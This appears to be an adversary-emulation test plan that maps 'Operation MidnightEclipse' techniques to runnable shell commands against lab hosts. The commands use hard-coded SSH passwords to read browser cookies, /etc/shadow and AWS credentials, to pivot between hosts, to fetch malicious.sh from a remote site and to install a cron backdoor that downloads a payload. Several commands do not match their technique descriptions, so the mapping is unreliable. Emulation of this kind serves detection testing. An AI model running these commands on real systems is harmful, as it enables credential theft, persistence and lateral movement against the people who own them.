name: T1005 - Data from Local System
description: During Operation MidnightEclipse, threat actors stole saved cookies and login data from targeted systems.

executors.name: sh
executors.command: curl -s --noproxy '*' http://172.21.0.20 -o /dev/null; sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'cat /home/attacker/.config/google-chrome/Default/Cookies'

name: T1078.002 - Domain Accounts
description: During Operation MidnightEclipse, threat actors used a compromised domain admin account to move laterally.

name: T1003.003 - NTDS
description: During Operation MidnightEclipse, threat actors obtained active directory credentials via the NTDS.DIT file.

name: T1059.004 - Unix Shell
description: During Operation MidnightEclipse, threat actors piped output from stdout to bash for execution.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://example.com/malicious.sh | cat'

name: T1090 - Proxy
description: During Operation MidnightEclipse, threat actors used the GO Simple Tunnel reverse proxy tool.

name: T1559 - Inter-Process Communication
description: During Operation MidnightEclipse, threat actors wrote output to stdout then piped it to bash for execution.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "ls -la" | socat - UNIX-CONNECT:/tmp/mysocket'

name: T1071.001 - Web Protocols
description: During Operation MidnightEclipse, threat actors used `wget` via HTTP to retrieve payloads.

name: T1078 - Valid Accounts
description: During Operation MidnightEclipse, threat actors extracted sensitive credentials while moving laterally through compromised networks.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 id; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cat /etc/shadow' > /tmp/shadow_hosta.txt; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p "RootPass123" ssh -o StrictHostKeyChecking=no root@172.22.0.20 id'

name: T1190 - Exploit Public-Facing Application
description: During Operation MidnightEclipse, threat actors exploited CVE-2024-3400 in Palo Alto Networks GlobalProtect.

name: T1584.003 - Virtual Private Server
description: During Operation MidnightEclipse, threat actors abused Virtual Private Servers to store malicious files.

executors.name: sh
executors.command: sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'id && cat /etc/passwd' && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.22.0.20 id'

name: T1105 - Ingress Tool Transfer
description: During Operation MidnightEclipse, threat actors downloaded additional payloads on compromised devices.

name: T1588.002 - Tool
description: During Operation MidnightEclipse, threat actors used the GO Simple Tunnel (GOST) reverse proxy tool.

name: T1053.003 - Cron
description: During Operation MidnightEclipse, threat actors configured cron jobs to retrieve payloads from actor-controlled infrastructure.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'

name: T1021.002 - SMB/Windows Admin Shares
description: During Operation MidnightEclipse, threat actors used SMB to pivot internally in victim networks.

name: T1074.001 - Local Data Staging
description: During Operation MidnightEclipse, threat actors copied files to the web application folder on compromised devices for exfiltration.

name: T1021.006 - Windows Remote Management
description: During Operation MidnightEclipse, threat actors used WinRM to move laterally in targeted networks.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p "RootPass123" ssh -o StrictHostKeyChecking=no root@172.22.0.20 hostname'

name: T1584.006 - Web Services
description: During Operation MidnightEclipse, threat actors abused compromised AWS buckets to store files.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 "cat ~/.aws/credentials" && echo "aws s3 ls not available on lab!"
